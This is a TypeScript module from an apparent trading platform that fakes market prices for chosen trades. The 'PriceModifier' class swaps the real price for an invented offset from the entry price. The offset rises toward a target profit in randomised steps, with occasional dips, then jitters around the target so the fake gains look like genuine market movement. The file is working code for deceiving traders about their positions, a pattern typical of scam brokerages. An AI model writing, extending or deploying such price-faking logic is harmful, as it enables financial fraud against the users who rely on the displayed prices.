import { storage } from "../storage";
import { getInstrument } from "@shared/instrumentRegistry";

type TradeControlState = {
  tradeId: number;
  userId: string;
  forceProfitable: boolean;
  profitSpeed: string;
  targetPips: number;
  accumulatedOffset: number;
  product: string;
  consolidating: boolean;
  jitterPips: number;
};

const SPEED_STEPS: Record<string, number> = {
  slow: 1,
  normal: 5,
  fast: 20,
};

class PriceModifier {
  private controls = new Map<number, TradeControlState>();

  async loadAll(): Promise<void> {
    try {
      const all = await storage.listTradeControls();
      this.controls.clear();
      for (const tc of all) {
        if (tc.forceProfitable && tc.isActive && tc.order?.product?.symbol) {
          this.controls.set(tc.tradeId, {
            tradeId: tc.tradeId,
            userId: tc.userId,
            forceProfitable: tc.forceProfitable,
            profitSpeed: tc.profitSpeed,
            targetPips: tc.targetPips,
            accumulatedOffset: 0,
            product: tc.order.product.symbol,
            consolidating: false,
            jitterPips: 0,
          });
        }
      }
    } catch {}
  }

  advanceAll(): void {
    for (const [, ctrl] of this.controls) {
      if (!ctrl.forceProfitable) continue;
      const pipSize = getInstrument(ctrl.product).pipSize;

      if (ctrl.consolidating) {
        ctrl.jitterPips += (Math.random() - 0.5) * 4;
        ctrl.jitterPips = Math.max(-17, Math.min(17, ctrl.jitterPips));
        if (Math.abs(ctrl.jitterPips) < 5) {
          ctrl.jitterPips += ctrl.jitterPips >= 0 ? 3 : -3;
        }
        ctrl.accumulatedOffset = (ctrl.targetPips + ctrl.jitterPips) * pipSize;
        continue;
      }

      const maxOffset = ctrl.targetPips * pipSize;
      if (ctrl.accumulatedOffset >= maxOffset) {
        ctrl.consolidating = true;
        ctrl.jitterPips = 0;
        ctrl.accumulatedOffset = maxOffset;
        continue;
      }
      const avgPips = SPEED_STEPS[ctrl.profitSpeed] || SPEED_STEPS.normal;
      let stepPips: number;
      const r = Math.random();
      if (r < 0.25) {
        stepPips = -(Math.random() * avgPips * 0.5);
      } else {
        stepPips = Math.random() * avgPips * 2.8;
      }
      const newOffset = ctrl.accumulatedOffset + stepPips * pipSize;
      ctrl.accumulatedOffset = Math.min(Math.max(0, newOffset), maxOffset);
    }
  }

  getEffectivePrice(tradeId: number, entryPrice: number, rawPrice: number, tradeType: string): number {
    const ctrl = this.controls.get(tradeId);
    if (!ctrl || !ctrl.forceProfitable) return rawPrice;
    if (tradeType === "buy") return entryPrice + ctrl.accumulatedOffset;
    return entryPrice - ctrl.accumulatedOffset;
  }

  set(config: { tradeId: number; userId: string; forceProfitable: boolean; profitSpeed: string; targetPips: number; product: string }): void {
    if (config.forceProfitable) {
      const existing = this.controls.get(config.tradeId);
      const pipSize = getInstrument(config.product).pipSize;
      const newMaxOffset = config.targetPips * pipSize;
      const existingOffset = existing?.accumulatedOffset ?? 0;
      this.controls.set(config.tradeId, {
        tradeId: config.tradeId,
        userId: config.userId,
        forceProfitable: true,
        profitSpeed: config.profitSpeed,
        targetPips: config.targetPips,
        accumulatedOffset: Math.min(existingOffset, newMaxOffset),
        product: config.product,
        consolidating: false,
        jitterPips: 0,
      });
    } else {
      this.controls.delete(config.tradeId);
    }
  }

  remove(tradeId: number): void {
    this.controls.delete(tradeId);
  }

  private deactivateInDb(tradeId: number): void {
    storage.deactivateTradeControl(tradeId).catch(() => {});
  }

  getState(tradeId: number): TradeControlState | undefined {
    return this.controls.get(tradeId);
  }

  listStates(): { tradeId: number; currentPips: number; targetPips: number; progressPct: number; consolidating: boolean }[] {
    const result: { tradeId: number; currentPips: number; targetPips: number; progressPct: number; consolidating: boolean }[] = [];
    for (const [tradeId, ctrl] of this.controls) {
      const pipSize = getInstrument(ctrl.product).pipSize;
      const currentPips = Math.round(ctrl.accumulatedOffset / pipSize);
      const progressPct = ctrl.targetPips > 0 ? parseFloat(((currentPips / ctrl.targetPips) * 100).toFixed(1)) : 100;
      result.push({ tradeId, currentPips, targetPips: ctrl.targetPips, progressPct, consolidating: ctrl.consolidating });
    }
    return result;
  }
}

export const priceModifier = new PriceModifier();
